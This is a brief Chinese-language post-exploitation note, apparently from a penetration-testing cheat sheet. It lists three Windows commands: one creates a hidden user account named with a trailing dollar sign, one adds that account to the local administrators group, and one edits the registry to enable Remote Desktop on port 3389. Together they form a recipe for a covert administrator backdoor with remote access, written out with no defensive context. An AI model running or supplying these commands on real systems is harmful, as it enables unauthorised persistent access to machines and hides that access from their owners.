留下隐藏用户的权限：

`net user feiyu$ feiyu /add`

将建立的用户加入到管理员组。

`net localgroup administrators feiyu$ /add`

在用户的cmd 下开启3389远程端口。

​	`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

